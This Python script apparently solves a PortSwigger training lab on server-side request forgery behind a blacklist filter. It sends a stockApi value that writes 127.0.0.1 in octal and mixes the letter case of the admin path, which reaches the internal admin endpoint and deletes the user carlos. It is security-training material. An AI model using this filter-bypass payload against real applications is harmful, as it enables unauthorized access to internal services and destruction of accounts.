#!/usr/bin/env python3
# Lab: SSRF with blacklist-based input filter
# Lab-Link: https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter
# Difficulty: PRACTITIONER
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def main():
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    url = f'{host}/product/stock'
    data = {'stockApi': f'http://017700000001/AdMiN/delete?username=carlos'}
    if client.post(url, data=data, allow_redirects=False).status_code != 302:
        print(f'[-] Failed to delete user carlos')
        sys.exit(-2)
    print(f'[+] Deletion of user carlos appears to be successful, attempting to verify')

    if 'Congratulations, you solved the lab!' not in client.get(host).text:
        print(f'[-] Failed to verify')
        sys.exit(-3)

    print(f'[+] Lab solved')


if __name__ == "__main__":
    main()